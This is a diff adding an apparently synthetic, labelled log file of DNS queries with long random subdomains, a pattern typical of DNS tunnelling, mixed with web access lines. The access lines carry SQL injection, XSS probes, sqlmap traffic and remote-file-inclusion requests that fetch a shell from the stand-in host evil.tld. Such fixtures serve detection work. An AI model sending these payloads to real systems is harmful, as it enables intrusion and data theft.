@@ -1,0 +1,291 @@
+Aug 21 10:13:30 dns01 named[222]: client 56.60.4.77#53: query: 7bbr66qj0td444665k7e8.github.com IN A + (127.0.0.1)hit
+Aug 21 10:13:30 dns01 named[222]: client 53.6.184.219#53: query: urhhtcotpy5y9bfs7t3jrwuvfz8b.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:13:30 dns01 named[222]: client 91.157.176.253#53: query: c124c9nwxdodqcr4qrwm5u46q9erkbexucydl4l.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:13:30 dns01 named[222]: client 189.134.21.47#53: query: 8u12y5x1kgiw20mf5exqd.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:13:31 dns01 named[222]: client 71.115.105.98#53: query: ihncy2yzo79h1jugw5gweko7kp.corp.local IN A + (127.0.0.1)hit
+137.136.189.65 - - [21/Aug/2025:10:13:31 +0000] "HEAD /login HTTP/1.1" 500 3344 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"hit
+Aug 21 10:13:32 dns01 named[222]: client 71.122.47.151#53: query: i3evqze9lpu5nfv176eex8ck4u7.updates.microsoft.com IN A + (127.0.0.1)hit
+169.214.147.34 - - [21/Aug/2025:10:13:32 +0000] "POST /search?q=onerror=alert(1) HTTP/1.1" 403 3122 "-" "sqlmap/1.7.10"hit
+23.94.205.242 - - [21/Aug/2025:10:13:33 +0000] "HEAD /search HTTP/1.1" 404 1490 "-" "Wget/1.21.4"hit
+Aug 21 10:13:34 dns01 named[222]: client 204.160.21.155#53: query: dkfduz4fmrzw8ev5jajs1l6nkyb.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:13:35 dns01 named[222]: client 160.183.231.132#53: query: gmpkj9b09zyfm0ih13f3na9zr31m.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:13:35 dns01 named[222]: client 174.37.2.187#53: query: 8h5c4xsjfm9qrwhem3syvqbm1qc.example.com IN A + (127.0.0.1)hit
+Aug 21 10:13:37 dns01 named[222]: client 91.79.104.221#53: query: 20qfb6gf8778kgh5y0e0dyccb3ibki0zr3.example.com IN A + (127.0.0.1)hit
+Aug 21 10:13:37 dns01 named[222]: client 116.63.193.206#53: query: 2pysla9d7iqlzk7av89839ui5g4f1.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:13:39 dns01 named[222]: client 206.15.70.4#53: query: zjg2uaffdb78bhb9uv7d6rgyq93klgx8jpjd20.updates.microsoft.com IN A + (127.0.0.1)hit
+56.33.69.7 - - [21/Aug/2025:10:13:39 +0000] "HEAD /admin HTTP/1.1" 500 485 "https://updates.microsoft.com/search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"hit
+Aug 21 10:13:39 dns01 named[222]: client 35.18.120.139#53: query: kz2ijlg7ttdeefyh2x53hx3eofe4.example.com IN A + (127.0.0.1)hit
+Aug 21 10:13:39 dns01 named[222]: client 49.149.222.99#53: query: kvqqologrdvkkhkgu7pn23e6.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:13:40 dns01 named[222]: client 158.178.127.242#53: query: br7vtnzcvem714acpmuboym4odwhw3prjq73smgi9.internal.svc IN A + (127.0.0.1)hit
+201.92.235.239 - - [21/Aug/2025:10:13:40 +0000] "HEAD / HTTP/1.1" 403 1213 "https://github.com/index.php" "sqlmap/1.7.10"hit
+Aug 21 10:13:40 dns01 named[222]: client 92.205.170.45#53: query: 9m7x9umnzswwrn4plh7e.example.com IN A + (127.0.0.1)hit
+Aug 21 10:13:41 dns01 named[222]: client 3.170.150.147#53: query: 7mcafu64pyi9chjzkpdditxiux5e3n7kpf.updates.microsoft.com IN A + (127.0.0.1)hit
+27.113.81.141 - - [21/Aug/2025:10:13:41 +0000] "POST /?id=1&q=file=http://evil.tld/shell.txt HTTP/1.1" 500 1451 "-" "sqlmap/1.7.10"hit
+100.87.220.96 - - [21/Aug/2025:10:13:42 +0000] "POST /search?q=file=http://evil.tld/shell.txt HTTP/1.1" 403 2139 "-" "Mozilla/5.0 (X11; Linux x86_64)"hit
+Aug 21 10:13:43 dns01 named[222]: client 171.160.63.253#53: query: oj4gqxsj1w7yicqbphksf5ykjcgc81667.github.com IN A + (127.0.0.1)hit
+Aug 21 10:13:43 dns01 named[222]: client 137.219.176.199#53: query: 1e6vff1kigq2266cradgqp8kzp2engbga7fl1yu4kq9ue.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:13:44 dns01 named[222]: client 212.77.34.252#53: query: e36kcxqnxv497s9spykz5r7sx3.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:13:46 dns01 named[222]: client 84.77.182.140#53: query: 133rkvclbvc8hqv3c0uu8bosz0hi2qbf97ouhiad.updates.microsoft.com IN A + (127.0.0.1)hit
+115.92.18.241 - - [21/Aug/2025:10:13:46 +0000] "HEAD /index.php HTTP/1.1" 500 145 "-" "Wget/1.21.4"hit
+Aug 21 10:13:46 dns01 named[222]: client 175.63.66.196#53: query: grfmm57dlz70ucpx50zjam6e8ltsbf5v9ho69xps46.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:13:46 dns01 named[222]: client 127.119.219.19#53: query: w731mtlbm19ticq4y6oh0icgfa6umyfu3j9fv6jwl.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:13:47 dns01 named[222]: client 66.56.159.44#53: query: ysqwkz6gght039fauf340e5zfelsp.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:13:48 dns01 named[222]: client 112.17.155.59#53: query: rqbqetdzp6e991krwwwjw4xruibrpf34azc.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:13:48 dns01 named[222]: client 55.11.185.167#53: query: 4zs3q3agrgtlvzkgldircc1j4648sm3i.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:13:48 dns01 named[222]: client 159.62.212.85#53: query: rlewqou0n5r79txcvug1b99b0rdn8q1u4anvsufq29z.internal.svc IN A + (127.0.0.1)hit
+135.6.37.125 - - [21/Aug/2025:10:13:48 +0000] "HEAD /?id=1 HTTP/1.1" 200 679 "-" "sqlmap/1.7.10"hit
+Aug 21 10:13:48 dns01 named[222]: client 56.62.31.67#53: query: dwl746bekyfvzhgol04e8jxqv7b9madw5hb56mfy.github.com IN A + (127.0.0.1)hit
+Aug 21 10:13:48 dns01 named[222]: client 48.72.35.173#53: query: thj0rvzr9hda3sn66uy723m2n922u794ax1.example.com IN A + (127.0.0.1)hit
+Aug 21 10:13:49 dns01 named[222]: client 203.176.162.83#53: query: p2kexowblxxur8na0rvowd3iu77x4m9u6omkt.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:13:49 dns01 named[222]: client 112.35.130.61#53: query: q7v79vw2v4lz20e9snxxx12gk4jg2scgfy7rc6ch47.github.com IN A + (127.0.0.1)hit
+Aug 21 10:13:49 dns01 named[222]: client 67.229.34.60#53: query: u1jsz6rzvbxp6yllatamgc6xb7hcxr.github.com IN A + (127.0.0.1)hit
+Aug 21 10:13:49 dns01 named[222]: client 19.31.225.94#53: query: bd6kyzvjtuwc8np5g6m349bgzqz7y.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:13:50 dns01 named[222]: client 50.234.126.121#53: query: b0qdy12ptpjfpr38527e1pnvan7qlx5cm41jya.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:13:50 dns01 named[222]: client 112.214.151.95#53: query: e1vtbn93kbjqp5lw0bjkp.internal.svc IN A + (127.0.0.1)hit
+45.22.251.162 - - [21/Aug/2025:10:13:50 +0000] "HEAD /login HTTP/1.1" 404 2802 "https://github.com/?id=1" "Go-http-client/1.1"hit
+127.109.250.71 - - [21/Aug/2025:10:13:51 +0000] "POST /admin?q=' OR '1'='1 HTTP/1.1" 200 2189 "-" "Go-http-client/1.1"hit
+Aug 21 10:13:51 dns01 named[222]: client 59.229.250.84#53: query: saxfg6s07tqxu8o4t5u82a8ibye9qrky1f.github.com IN A + (127.0.0.1)hit
+101.214.87.96 - - [21/Aug/2025:10:13:51 +0000] "POST /?id=1&q=onerror=alert(1) HTTP/1.1" 200 2114 "-" "curl/8.0.1"hit
+Aug 21 10:13:52 dns01 named[222]: client 166.51.103.142#53: query: 3e8o055szaqf1m9ef5fzjl.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:13:52 dns01 named[222]: client 174.151.65.217#53: query: loyvkv9iamp2afqxunijw4h1t57yeitzfiu4io.github.com IN A + (127.0.0.1)hit
+191.183.72.152 - - [21/Aug/2025:10:13:52 +0000] "HEAD /?id=1 HTTP/1.1" 200 3435 "-" "Wget/1.21.4"hit
+Aug 21 10:13:53 dns01 named[222]: client 38.99.154.253#53: query: 8ajt60keoe1m81fx0priopei1.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:13:53 dns01 named[222]: client 106.229.54.66#53: query: x8gge3vtxfed18azjhj9twcxhyvgevacyzk.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:13:53 dns01 named[222]: client 149.89.76.169#53: query: xdkvij4wxfz6a1cti1gijimey3wcngass0.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:13:54 dns01 named[222]: client 105.1.204.144#53: query: d5u8fbfp0d6pzpv9owd2noawit45li1ca5mbmhf.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:13:54 dns01 named[222]: client 171.189.164.15#53: query: f5k8do9vqgql0295a4bnj39943.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:13:54 dns01 named[222]: client 181.202.246.169#53: query: ta6eryf4bhgd8ezb413qjo4.example.com IN A + (127.0.0.1)hit
+Aug 21 10:13:54 dns01 named[222]: client 40.188.141.72#53: query: 7m51an4d3uj082pfn1xteall4cjczsqz.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:13:55 dns01 named[222]: client 193.126.5.19#53: query: 9939ygnyrco19fspuidnokoskw157wb7.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:13:55 dns01 named[222]: client 67.170.222.82#53: query: ph62tnybzy2y63p7a8hvu6hj636opthnzmh4z51dh.example.com IN A + (127.0.0.1)hit
+66.140.72.61 - - [21/Aug/2025:10:13:55 +0000] "HEAD /index.php HTTP/1.1" 500 1540 "https://corp.local/search" "Wget/1.21.4"hit
+Aug 21 10:13:56 dns01 named[222]: client 211.112.53.78#53: query: z4gcwp7ilyy0nekfs2o4s7ky9riz8l3vr9bo5jvywjg.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:13:56 dns01 named[222]: client 193.94.56.251#53: query: 7m375n1upqpiyotbf99w3h1sikadejt7kyds.github.com IN A + (127.0.0.1)hit
+Aug 21 10:13:56 dns01 named[222]: client 119.219.176.40#53: query: gicz5mmp44cw3xrevy89qufucarx9uqv.github.com IN A + (127.0.0.1)hit
+Aug 21 10:13:57 dns01 named[222]: client 74.7.92.165#53: query: 83h7ml7kz6ck7vix23qqhxu84du70c8z7u7.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:13:57 dns01 named[222]: client 189.239.197.173#53: query: x3xopcpqwfgsdpzoeugitwj1oq0mo689630pjxi.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:13:57 dns01 named[222]: client 27.37.229.42#53: query: b4vwfe4ocvcuvyk70w4xsav30zdp4x43nhix.github.com IN A + (127.0.0.1)hit
+Aug 21 10:13:57 dns01 named[222]: client 190.99.86.136#53: query: cuvxdie2wv505umn0zc7onula.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:13:58 dns01 named[222]: client 187.66.93.86#53: query: axdbffmsyhnxoxrotbnf26706cwh68mn2sc8ucx0x.updates.microsoft.com IN A + (127.0.0.1)hit
+84.173.75.68 - - [21/Aug/2025:10:13:58 +0000] "HEAD /?id=1 HTTP/1.1" 500 1274 "https://example.com/admin" "Wget/1.21.4"hit
+46.202.31.17 - - [21/Aug/2025:10:14:00 +0000] "POST /api/v1/items?q=onerror=alert(1) HTTP/1.1" 200 2083 "https://internal.svc/search" "curl/8.0.1"hit
+Aug 21 10:14:00 dns01 named[222]: client 117.115.191.155#53: query: p1gp7lc7830iabkhpg7ul.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:14:00 dns01 named[222]: client 223.19.49.216#53: query: hdum4udegnn0jt070sh8my8qvpqhk4wnqacfck50724n9.example.com IN A + (127.0.0.1)hit
+126.229.34.187 - - [21/Aug/2025:10:14:01 +0000] "HEAD /admin HTTP/1.1" 200 3434 "-" "Wget/1.21.4"hit
+Aug 21 10:14:01 dns01 named[222]: client 182.222.25.240#53: query: tx0xspeqtz4ud3um17lnrznjzreszrt14zc4hw6re.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:14:02 dns01 named[222]: client 123.200.183.87#53: query: 24h5kxeas7dsyt6lk9ocwa13viw8jmsw6e3h2zzpx266.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:02 dns01 named[222]: client 117.168.114.15#53: query: jie3097jxoif7usg50fdibxa5zfxvwfqm3mh3rx.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:14:02 dns01 named[222]: client 149.115.209.213#53: query: b79ybye1evizaytwf9iy1oc1h7opr0g7ylyvbcza1kb.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:14:03 dns01 named[222]: client 129.141.146.126#53: query: xhm1m6mq7wwuwhi1ojo05gio9d.updates.microsoft.com IN A + (127.0.0.1)hit
+190.57.93.160 - - [21/Aug/2025:10:14:03 +0000] "POST /admin?q=' OR '1'='1 HTTP/1.1" 200 2429 "-" "sqlmap/1.7.10"hit
+Aug 21 10:14:04 dns01 named[222]: client 1.30.25.111#53: query: lrch1w28k8gmwabu5ttjf0ja.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:04 dns01 named[222]: client 30.201.210.170#53: query: hb4ot1wkkq4tqgj96qkx3ei5lwsaep2yb7iesx4gb1s7h.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:05 dns01 named[222]: client 66.57.60.211#53: query: m3ts3lktebjykwsdrk2efy9u0zo2.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:05 dns01 named[222]: client 38.92.208.96#53: query: z440s6rwnpp9t1s16bt7.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:14:05 dns01 named[222]: client 98.16.242.40#53: query: 8hzlljj3bqex25yxu18xb3z60myw6b9fuslqwgj5o209.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:06 dns01 named[222]: client 110.161.174.132#53: query: wv8n27whzokx8q64a60tn3o3cogm0lg1dvo4vhdsp.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:07 dns01 named[222]: client 133.93.236.102#53: query: m2ppzx2stey52rh7we482rh55kse6uf13w9drf0.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:07 dns01 named[222]: client 122.77.117.249#53: query: bc9gapp5degmwji8wdzlwge74r7oasoi0kx2cs.internal.svc IN A + (127.0.0.1)hit
+142.20.7.120 - - [21/Aug/2025:10:14:08 +0000] "POST /index.php?q=onerror=alert(1) HTTP/1.1" 500 2053 "-" "Mozilla/5.0 (X11; Linux x86_64)"hit
+Aug 21 10:14:08 dns01 named[222]: client 122.36.196.144#53: query: y3qnp0fsm8bjvk1z729se012v97cdl070cqiuz.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:08 dns01 named[222]: client 12.124.100.127#53: query: bjjmz8kdw0m7vfq7kywa3qxeok79j7lepzh5.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:09 dns01 named[222]: client 153.169.120.127#53: query: m4dd4r0yxk1i6x6dv3d3vvsf.updates.microsoft.com IN A + (127.0.0.1)hit
+150.230.176.14 - - [21/Aug/2025:10:14:09 +0000] "POST /search?q=file=http://evil.tld/shell.txt HTTP/1.1" 200 1991 "-" "Go-http-client/1.1"hit
+Aug 21 10:14:09 dns01 named[222]: client 15.101.3.211#53: query: fwmkmhq0c3fe98v3ligivhg466b8b7da.corp.local IN A + (127.0.0.1)hit
+66.206.54.38 - - [21/Aug/2025:10:14:10 +0000] "HEAD /login HTTP/1.1" 302 3150 "-" "curl/8.0.1"hit
+Aug 21 10:14:10 dns01 named[222]: client 11.128.134.141#53: query: xlsa39pqrurgxrhtclrtm4mfjqyl2eo8wts0i6e5vx.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:10 dns01 named[222]: client 58.235.181.146#53: query: 2n01q0y6fa40ul3x9v651o8n.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:10 dns01 named[222]: client 211.251.12.131#53: query: hvzht1wj8r5c9a4oqy2foraj2.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:11 dns01 named[222]: client 21.231.32.117#53: query: bx23kd0gt8o4xlfg01ns4q1jv8cj7y3nwk18x8ab.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:12 dns01 named[222]: client 220.244.201.178#53: query: pfren5sydhpcctww3dt46fuyqyhpamy.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:12 dns01 named[222]: client 208.217.60.116#53: query: xei429gy05vuz7dg7clz0g4lf2a.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:13 dns01 named[222]: client 153.242.154.61#53: query: 5qlxtpf1wl7jotb2gi38qtsdggxka2xb4898kx9.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:13 dns01 named[222]: client 47.3.217.16#53: query: 6wb2pqhvkpemhtqcaxxjeo7foabdqi39.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:14:13 dns01 named[222]: client 167.120.66.60#53: query: iuurn0f5osorcan3czeb3itf3oovkghiv.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:13 dns01 named[222]: client 63.162.201.77#53: query: jr2ocx9d4k5l3q0u64ogbt0m0cgghlsr.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:13 dns01 named[222]: client 219.168.181.23#53: query: sf33qzx729wk585ic4ucmvatdohm9k.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:13 dns01 named[222]: client 96.116.149.90#53: query: l7kalqgcvkfjp09kvdczywh0v7r3ix9n3fwyxyj38d.example.com IN A + (127.0.0.1)hit
+192.149.134.60 - - [21/Aug/2025:10:14:14 +0000] "HEAD /?id=1 HTTP/1.1" 404 3438 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"hit
+105.178.240.66 - - [21/Aug/2025:10:14:14 +0000] "HEAD / HTTP/1.1" 500 3255 "https://corp.local/wp-login.php" "Wget/1.21.4"hit
+Aug 21 10:14:15 dns01 named[222]: client 201.124.88.90#53: query: i90edwfrdlcuwy6m3glhsdpm8xw5ga90dl4rh1153r7.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:14:15 dns01 named[222]: client 86.47.172.170#53: query: e79z09mx4syerxiemtocia524uzamh7yphgarvx2.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:15 dns01 named[222]: client 65.147.117.133#53: query: 7okfdjx9ylgc5hzxx0i7z1r.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:14:16 dns01 named[222]: client 208.252.120.23#53: query: qfzown47zgq4oytcda1ni780phbh4r39.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:16 dns01 named[222]: client 27.222.240.57#53: query: 639tg2ugqz2as9m2bfyw1fqzu4410083vm.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:14:16 dns01 named[222]: client 136.47.252.60#53: query: pu2cf5oapynsluhcna1tuqxf6w0llnz2boi.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:17 dns01 named[222]: client 178.159.245.75#53: query: yikbttm2og1bv7sme3bbqywahynu98x55o16imvdt.internal.svc IN A + (127.0.0.1)hit
+81.220.216.134 - - [21/Aug/2025:10:14:17 +0000] "POST /?q=onerror=alert(1) HTTP/1.1" 404 2574 "-" "Mozilla/5.0 (X11; Linux x86_64)"hit
+79.105.124.77 - - [21/Aug/2025:10:14:18 +0000] "POST /login?q=onerror=alert(1) HTTP/1.1" 403 2184 "-" "sqlmap/1.7.10"hit
+Aug 21 10:14:18 dns01 named[222]: client 163.74.249.201#53: query: vp6xqi8sgna1nwtbh7jqcca9y3rje.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:14:18 dns01 named[222]: client 104.84.201.224#53: query: 70ndy330cltsurol18dq.updates.microsoft.com IN A + (127.0.0.1)hit
+158.52.31.89 - - [21/Aug/2025:10:14:18 +0000] "POST /?id=1&q=file=http://evil.tld/shell.txt HTTP/1.1" 302 3938 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"hit
+Aug 21 10:14:19 dns01 named[222]: client 166.228.92.96#53: query: lo16b4ybvgewx06m5263wb2d04db835arfpvgmg28y.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:19 dns01 named[222]: client 32.240.134.16#53: query: 179snnbzy5bjbgott0uuye9qcnqayfk9roc.example.com IN A + (127.0.0.1)hit
+116.5.7.51 - - [21/Aug/2025:10:14:20 +0000] "POST /login?q=file=http://evil.tld/shell.txt HTTP/1.1" 500 1135 "-" "sqlmap/1.7.10"hit
+Aug 21 10:14:20 dns01 named[222]: client 64.145.1.21#53: query: l5gbjix98qikkprdh9u0hblblp0z8fkhw02z76ofq6cw5.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:20 dns01 named[222]: client 172.98.170.148#53: query: 9vej78bkr1k0jryca4ndh0nw.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:21 dns01 named[222]: client 182.226.125.184#53: query: jhe3wzgg448puz172mv6dnc3c47kbadnfh.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:21 dns01 named[222]: client 147.143.99.197#53: query: 55oudlm19ucklr2d59za52om3spl.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:14:22 dns01 named[222]: client 126.67.200.13#53: query: 9yy1k4mqnijy4srcd3kf3taetk.updates.microsoft.com IN A + (127.0.0.1)hit
+169.171.112.205 - - [21/Aug/2025:10:14:22 +0000] "HEAD /login HTTP/1.1" 302 1102 "-" "sqlmap/1.7.10"hit
+Aug 21 10:14:22 dns01 named[222]: client 90.0.153.171#53: query: 6c7t6xoylpqukpm4ky35eh16vmkm8vmx70uvq.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:14:23 dns01 named[222]: client 170.175.154.14#53: query: asq67377tt2m6u6h54a9s.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:23 dns01 named[222]: client 1.172.60.17#53: query: u80qfbeggbeyug2aw6fd4fn3c20q4y2c5xitjj1y.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:23 dns01 named[222]: client 25.82.88.35#53: query: wgqu37hwvjxgik9t6n42y.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:24 dns01 named[222]: client 55.246.108.193#53: query: 3qmh1z3mj4nx24xkg5e4sik77coiyjyp53jmas3vy.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:14:24 dns01 named[222]: client 88.228.219.213#53: query: qymkcd2ved76wv85fedcfmi8c4i8u.example.com IN A + (127.0.0.1)hit
+128.242.78.135 - - [21/Aug/2025:10:14:24 +0000] "HEAD /login HTTP/1.1" 302 1800 "-" "Mozilla/5.0 (X11; Linux x86_64)"hit
+182.4.80.97 - - [21/Aug/2025:10:14:25 +0000] "HEAD /search HTTP/1.1" 200 2352 "https://github.com/search" "curl/8.0.1"hit
+Aug 21 10:14:26 dns01 named[222]: client 156.210.146.178#53: query: 6kwxgtdxjl5d07bnf3skds.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:26 dns01 named[222]: client 27.255.11.165#53: query: v58uciolwlxn4gwpszq5u1sbyesvawf7pd8jd8xkea3.example.com IN A + (127.0.0.1)hit
+56.39.180.147 - - [21/Aug/2025:10:14:26 +0000] "HEAD /search HTTP/1.1" 500 1291 "-" "Go-http-client/1.1"hit
+Aug 21 10:14:28 dns01 named[222]: client 122.136.81.150#53: query: e0e08jsgr2dgb27os06pqug53ma0u.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:14:28 dns01 named[222]: client 206.222.120.113#53: query: 5slj3um0ptdqgfoqz5yaynec3xuubrbuaah17ir.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:28 dns01 named[222]: client 187.205.87.180#53: query: d4pkl19hvi2prcl0j1mm14s3630uf06bfw2tza.example.com IN A + (127.0.0.1)hit
+153.200.188.75 - - [21/Aug/2025:10:14:29 +0000] "POST /wp-login.php?q=' OR '1'='1 HTTP/1.1" 200 1111 "https://example.com/?id=1" "sqlmap/1.7.10"hit
+Aug 21 10:14:29 dns01 named[222]: client 163.167.105.138#53: query: p40doc4bsleg89evzrcya.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:29 dns01 named[222]: client 212.142.73.41#53: query: 52yv6ygufo9kjnkhw0dw0ojrqxzerhtgqv73j0gvch1c.example.com IN A + (127.0.0.1)hit
+199.112.249.217 - - [21/Aug/2025:10:14:29 +0000] "POST /api/v1/items?q=file=http://evil.tld/shell.txt HTTP/1.1" 200 1582 "-" "Go-http-client/1.1"hit
+Aug 21 10:14:30 dns01 named[222]: client 181.9.136.193#53: query: ruxxk62e1xryc6yij3rcmn60mi364gsr7ehv.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:30 dns01 named[222]: client 65.47.85.248#53: query: 7nsmckdt28cjsvppyp6f88md7zp62507f535k.example.com IN A + (127.0.0.1)hit
+154.184.51.185 - - [21/Aug/2025:10:14:30 +0000] "HEAD /index.php HTTP/1.1" 302 2320 "-" "Mozilla/5.0 (X11; Linux x86_64)"hit
+Aug 21 10:14:31 dns01 named[222]: client 119.86.199.179#53: query: tg4zyunh66dxnacm78sxowui8oi97vckx6js64ne8oko.github.com IN A + (127.0.0.1)hit
+42.220.235.239 - - [21/Aug/2025:10:14:31 +0000] "POST /search?q=' OR '1'='1 HTTP/1.1" 404 3693 "-" "Go-http-client/1.1"hit
+Aug 21 10:14:32 dns01 named[222]: client 16.188.205.71#53: query: k75d775w2vgivn05jwzszp.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:33 dns01 named[222]: client 35.130.228.235#53: query: bgj7frot3gdvdtrqcjqa08jwec30v3l717qz4il46yi.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:33 dns01 named[222]: client 144.88.122.121#53: query: nbc8lc6ufojb0pwom524cmdv.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:34 dns01 named[222]: client 39.245.53.20#53: query: iyygngyne9zifll5d7zyvpo.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:14:34 dns01 named[222]: client 178.95.189.187#53: query: z7ewo2g5ue2d9vrsrsmts17xubg9kvo3i02j.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:34 dns01 named[222]: client 218.209.69.3#53: query: egdue7ekgsonon7nmljqjssfcgu01w0kxtip3am3.github.com IN A + (127.0.0.1)hit
+78.82.166.224 - - [21/Aug/2025:10:14:34 +0000] "POST /login?q=' OR '1'='1 HTTP/1.1" 200 1560 "-" "sqlmap/1.7.10"hit
+Aug 21 10:14:35 dns01 named[222]: client 205.71.123.109#53: query: 8hq64osz9qao5h08dkl3h3aax484xi3.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:14:36 dns01 named[222]: client 143.13.149.196#53: query: q7vkab1fchxlj4yywnybmdkja22poitgfne9c2.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:36 dns01 named[222]: client 53.144.221.50#53: query: sr12w6hgnla2vqzve9vjn3lb7gj0kte4i6d.corp.local IN A + (127.0.0.1)hit
+183.95.104.48 - - [21/Aug/2025:10:14:36 +0000] "HEAD /search HTTP/1.1" 403 1999 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"hit
+Aug 21 10:14:37 dns01 named[222]: client 213.130.92.208#53: query: op2yrxqikhyat4ep85e7wsyx6waw347y30h3oo5xcqpig.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:37 dns01 named[222]: client 50.195.213.184#53: query: su4vv09im9zt6eixms5esa7lzq865.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:37 dns01 named[222]: client 49.95.135.69#53: query: nt14b26153hynf750f1ota3595flpqiiv4qvhtbpgx.github.com IN A + (127.0.0.1)hit
+62.5.252.92 - - [21/Aug/2025:10:14:38 +0000] "POST /?q=onerror=alert(1) HTTP/1.1" 404 3379 "-" "sqlmap/1.7.10"hit
+Aug 21 10:14:38 dns01 named[222]: client 82.139.179.104#53: query: jd2ppk5az5d9yj45188j28v2mqps50wzylqs8xm3rh.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:40 dns01 named[222]: client 201.74.180.241#53: query: hyiwg2drfc5j2zi09unttj.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:14:40 dns01 named[222]: client 102.226.216.227#53: query: rl1u6ddyavqz8hy2ypyx6.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:40 dns01 named[222]: client 31.77.128.44#53: query: 6qsfncds4cs87qdzflxf7alj9q4.internal.svc IN A + (127.0.0.1)hit
+212.174.190.87 - - [21/Aug/2025:10:14:41 +0000] "HEAD /wp-login.php HTTP/1.1" 200 2506 "https://example.com/index.php" "Wget/1.21.4"hit
+Aug 21 10:14:41 dns01 named[222]: client 208.102.129.165#53: query: 91h4pyeyz2l8q0w1q27yeyqy0303iuc54qytxyeyz6ssg.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:14:42 dns01 named[222]: client 53.45.244.169#53: query: t3xf03mauj0pnuib414wjbu6tys3thm9tv.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:42 dns01 named[222]: client 9.182.253.128#53: query: doey0f53xdxx35wcgqfkdxb4djhs0.updates.microsoft.com IN A + (127.0.0.1)hit
